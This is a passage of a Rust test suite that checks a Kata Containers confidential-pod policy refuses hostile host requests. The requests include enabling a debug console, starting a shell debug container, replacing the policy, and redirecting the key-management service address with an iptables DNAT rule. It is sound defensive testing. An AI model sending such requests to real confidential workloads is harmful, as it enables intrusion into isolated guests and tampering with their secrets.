        req["shared_mounts"] = json!([{"dst_ctr": "x", "dst_path": "/x", "name": "x", "src_ctr": "y", "src_path": "/y"}]);
    }),
    ("a hypervisor annotation", |_, _, req| {
        req["OCI"]["Annotations"]["io.katacontainers.config.hypervisor.kernel_params"] =
            json!("agent.debug_console");
    }),
    ("another pod's name", |_, _, req| {
        req["OCI"]["Annotations"]["io.kubernetes.cri.sandbox-name"] = json!("someone-else");
    }),
    ("the container named as another", |pod, idx, req| {
        let other = if pod.container_name(idx) == "alpha-runtime" {
            "app-debug"
        } else {
            "alpha-runtime"
        };
        req["OCI"]["Annotations"]["io.kubernetes.cri.container-name"] = json!(other);
    }),
    ("an ephemeral debug container", |_, _, req| {
        req["OCI"]["Annotations"]["io.kubernetes.cri.container-name"] = json!("debugger-x2x4z");
        req["OCI"]["Process"]["Args"] = json!(["sh"]);
    }),
];

#[test]
fn container_changes_after_launch_are_refused() {
    for pod in pods() {
        for idx in pod.app_containers() {
            let name = pod.container_name(idx).to_owned();
            for (what, change) in CONTAINER_CHANGES {
                // A restart under a new id, or a container the host adds; the launch already ran.
                let mut req = pod.create_container_as(idx, &hex(&format!("hostile {name} {what}")));
                change(&pod, idx, &mut req);
                assert_refused(
                    &pod,
                    "CreateContainerRequest",
                    &req,
                    &format!("{name} with {what}"),
                );
            }
        }
        // The pause container's own changes.
        let mut req = pod.create_container_as(0, &hex("hostile pause"));
        pull_pause_from_a_registry(&mut req);
        assert_refused(
            &pod,
            "CreateContainerRequest",
            &req,
            "pause container pulled from a registry",
        );
    }
}

#[test]
fn gpu_changes_are_refused() {
    let pod = Pod::load("gpu-model-server", "policy.rego");
    let vllm = pod.index("vllm");
    let mut two = pod.create_container_as(vllm, &hex("two gpus"));
    two["OCI"]["Annotations"]["cdi.k8s.io/vfio1"] = json!("nvidia.com/gpu=1");
    assert_refused(&pod, "CreateContainerRequest", &two, "a second GPU");
    let mut none = pod.create_container_as(vllm, &hex("no gpu"));
    none["OCI"]["Annotations"]
        .as_object_mut()
        .unwrap()
        .remove("cdi.k8s.io/vfio0");
    assert_refused(&pod, "CreateContainerRequest", &none, "no GPU");
    let runtime = pod.index("alpha-runtime");
    let mut stolen = pod.create_container_as(runtime, &hex("gpu in the runtime"));
    stolen["OCI"]["Annotations"]["cdi.k8s.io/vfio0"] = json!("nvidia.com/gpu=0");
    assert_refused(
        &pod,
        "CreateContainerRequest",
        &stolen,
        "the GPU given to the runtime",
    );
}

#[test]
fn the_cpu_pod_is_held_to_its_namespace() {
    let pod = Pod::load("cpu-app", "policy.rego");
    let mut req = pod.create_container_as(pod.index("app"), &hex("other namespace"));
    req["OCI"]["Annotations"]["io.kubernetes.cri.sandbox-namespace"] = json!("default");
    assert_refused(
        &pod,
        "CreateContainerRequest",
        &req,
        "the App in another namespace",
    );
}

#[test]
fn other_agent_calls_that_change_the_pod_are_refused() {
    for pod in pods() {
        let runtime = pod.index("alpha-runtime");
        let mut set_policy = pod.template("SetPolicyRequest");
        set_policy["policy"] = json!("package agent_policy\ndefault ExecProcessRequest := true\n");
        let mut update = pod.with_container("UpdateContainerRequest", runtime);
        update["resources"]["Memory"]["Limit"] = json!(1_i64 << 40);
        let mut mount = pod.template("UpdateEphemeralMountsRequest");
        mount["storages"] = json!([{
            "driver": "ephemeral", "driver_options": [], "fs_group": null, "fstype": "tmpfs",
            "mount_point": "/run/kata-containers/sandbox/ephemeral/runtime-socket", "options": [],
            "shared": false, "source": "tmpfs",
        }]);
        let mut iptables = pod.template("SetIPTablesRequest");
        iptables["data"] =
            json!(b"*nat\n-A OUTPUT -d 10.20.0.11 -j DNAT --to 10.0.0.66\nCOMMIT\n".to_vec());
        let mut lo = pod.template("UpdateInterfaceRequest");
        lo["interface"]["name"] = json!("lo");
        let mut route = pod.template("UpdateRoutesRequest");
        route["routes"]["Routes"][0]["source"] = json!("127.0.0.1");
        let mut arp = pod.template("AddARPNeighborsRequest");
        arp["neighbors"]["ARPNeighbors"][0]["toIPAddress"]["address"] = json!("127.0.0.1");
        let mut hooks = pod.create_sandbox();
        hooks["guest_hook_path"] = json!("/usr/share/oci/hooks");
        let mut modules = pod.create_sandbox();
        modules["kernel_modules"] = json!([{"name": "kvm", "parameters": []}]);
        let mut pidns = pod.create_sandbox();
        pidns["sandbox_pidns"] = json!(true);
        let cases: Vec<(&str, &str, Value)> = vec![
            ("SetPolicyRequest", "a new policy", set_policy),
            ("UpdateContainerRequest", "the runtime's resources", update),
            (
                "PauseContainerRequest",
                "the runtime paused",
                pod.with_container("PauseContainerRequest", runtime),
            ),
            (
                "ResumeContainerRequest",
                "a container resumed",
                pod.with_container("ResumeContainerRequest", runtime),
            ),
            (
                "UpdateEphemeralMountsRequest",
                "an in-guest volume remounted",
                mount,
            ),
            (
                "SetIPTablesRequest",
                "the KMS's address redirected",
                iptables,
            ),
            (
                "GetIPTablesRequest",
                "the guest's firewall read",
                pod.template("GetIPTablesRequest"),
            ),
            (
                "ListInterfacesRequest",
                "the guest's interfaces listed",
                pod.template("ListInterfacesRequest"),
            ),
            (
                "ListRoutesRequest",
                "the guest's routes listed",
                pod.template("ListRoutesRequest"),
            ),
            (
                "UpdateInterfaceRequest",
                "the loopback interface changed",
                lo,
            ),
            (
                "UpdateRoutesRequest",
                "a route from a loopback address",
                route,
            ),
            ("AddARPNeighborsRequest", "a loopback neighbour", arp),
            ("CreateSandboxRequest", "a guest hook", hooks),
            ("CreateSandboxRequest", "a kernel module", modules),
            ("CreateSandboxRequest", "a shared process namespace", pidns),
            (
                "AddSwapRequest",
                "swap added",
                pod.template("AddSwapRequest"),
            ),
            (
                "AddSwapPathRequest",
                "swap file added",
                pod.template("AddSwapPathRequest"),
            ),
            (
                "MemHotplugByProbeRequest",
                "memory hot-plugged",
                pod.template("MemHotplugByProbeRequest"),
            ),
            (
                "ReseedRandomDevRequest",
                "the RNG reseeded by the host",
                pod.template("ReseedRandomDevRequest"),
            ),
            (
                "SetGuestDateTimeRequest",
                "the guest clock set",
                pod.template("SetGuestDateTimeRequest"),
            ),
            (
                "ResizeVolumeRequest",
                "a volume resized",
                pod.template("ResizeVolumeRequest"),
            ),
            (
                "VolumeStatsRequest",
                "volume statistics",
                pod.template("VolumeStatsRequest"),
            ),
            (
                "GetMetricsRequest",
                "guest metrics",
                pod.template("GetMetricsRequest"),
            ),
            (
                "MemAgentMemcgConfig",
                "the memory agent's cgroup setting",
                pod.template("MemAgentMemcgConfig"),
            ),
            (
                "MemAgentCompactConfig",
                "the memory agent's compaction",
                pod.template("MemAgentCompactConfig"),
            ),
            ("StartTracingRequest", "tracing", json!({})),
        ];
        for (ep, what, req) in cases {
            assert_refused(&pod, ep, &req, what);
        }
    }
}

/// What the policy leaves the host, which already controls the pod's lifetime and network: none
/// of it reads or changes what runs. If one of these starts being refused the launch or stop of a
/// pod may break; if a refusal is wanted, move it to a test above.
#[test]
fn availability_calls_stay_with_the_host() {
    for pod in pods() {
        let mut agent = pod.launched();
        let runtime = pod.index("alpha-runtime");
        let mut kill = pod.with_container("SignalProcessRequest", runtime);
        kill["signal"] = json!(9);
        let mut stranger = pod.template("SignalProcessRequest");
        stranger["container_id"] = json!(hex("not a container of this pod"));
        stranger["signal"] = json!(9);
        let mut resize = pod.with_container("TtyWinResizeRequest", runtime);
        resize["row"] = json!(40);
        let shared = format!(
            "{SHARED}/{}-0123456789abcdef-resolv.conf",
            pod.container_id(runtime)
        );
        for (ep, what, req) in [
            ("SignalProcessRequest", "SIGKILL to the runtime", kill),
            (
                "SignalProcessRequest",
                "a signal to a container id the pod never had",
                stranger,
            ),
            ("TtyWinResizeRequest", "a terminal resize", resize),
            (
                "CopyFileRequest",
                "resolv.conf rewritten",
                Pod::copy_file(&shared, "Regular", None),
            ),
            (
                "RemoveStaleVirtiofsShareMountsRequest",
                "stale shares removed",
                pod.template("RemoveStaleVirtiofsShareMountsRequest"),
            ),
        ] {
            assert!(
                agent.allows(ep, &req),
                "{}: {what}: {ep} is no longer allowed",
                pod.label
            );
        }
        // Dropping a mount the spec lists: the container then fails to find what it mounts.
        let idx = pod.index("alpha-runtime");
        let mut req = pod.create_container_as(idx, &hex("mount dropped"));
        mounts_mut(&mut req).retain(|m| m["destination"] != "/run/alpha-pod");
        assert!(
            agent.allows("CreateContainerRequest", &req),
            "{}: the runtime without its init-data mount is no longer allowed",
            pod.label
        );
    }
}

/// genpolicy 4.1.0's rules alone: the gaps `alpha-rules.patch` closes. When an upstream release
/// closes them, these fail, and the patch can shrink.
#[test]
fn genpolicy_rules_alone_let_the_host_swap_the_image_and_unset_variables() {
    let pod = Pod::load("cpu-app", "policy-genpolicy-rules.rego");
    for idx in pod.app_containers() {
        let name = pod.container_name(idx).to_owned();
        for (what, change) in [
            &CONTAINER_CHANGES[0],
            &CONTAINER_CHANGES[1],
            &CONTAINER_CHANGES[6],
        ] {
            let mut agent = pod.launched();
            let mut req = pod.create_container_as(idx, &hex(&format!("stock {name} {what}")));
            change(&pod, idx, &mut req);
            assert!(
                agent.allows("CreateContainerRequest", &req),
                "genpolicy's own rules now refuse {name} with {what}"
            );
        }
    }
    let mut req = pod.create_container_as(0, &hex("stock pause"));
    pull_pause_from_a_registry(&mut req);
    assert!(
        pod.launched().allows("CreateContainerRequest", &req),
        "genpolicy's own rules now refuse a pause container pulled from a registry"
    );
}
